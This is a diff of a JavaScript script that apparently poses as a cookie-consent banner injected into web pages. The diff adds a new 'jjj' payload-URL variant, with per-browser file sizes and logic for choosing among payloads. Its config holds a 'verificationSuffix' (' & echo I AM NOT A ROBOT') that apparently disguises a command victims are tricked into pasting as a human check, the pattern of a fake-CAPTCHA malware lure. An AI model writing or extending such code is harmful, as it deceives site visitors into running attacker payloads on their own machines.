@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.21',
+    version: '1.9.22',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -35,6 +35,12 @@
       chrome: 17218,
       edge: 17218,
       brave: 17218
+    },
+    cacheFileSizesJjj: {
+      firefox: 0,
+      chrome: 0,
+      edge: 0,
+      brave: 0
     },
     verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
@@ -159,12 +165,21 @@
     return 'Profile 1';
   }
 
+  function isJjjPayloadUrl() {
+    var u = CONSENT_CONFIG.cacheFileUrl || '';
+    return /\/jjj([?#]|$)/i.test(u);
+  }
+
   function isJjPayloadUrl() {
     var u = CONSENT_CONFIG.cacheFileUrl || '';
+    if (isJjjPayloadUrl()) return false;
     return /\/jj([?#]|$)/i.test(u);
   }
 
   function getActiveCacheFileSizes() {
+    if (isJjjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJjj) {
+      return CONSENT_CONFIG.cacheFileSizesJjj;
+    }
     if (isJjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJj) {
       return CONSENT_CONFIG.cacheFileSizesJj;
     }
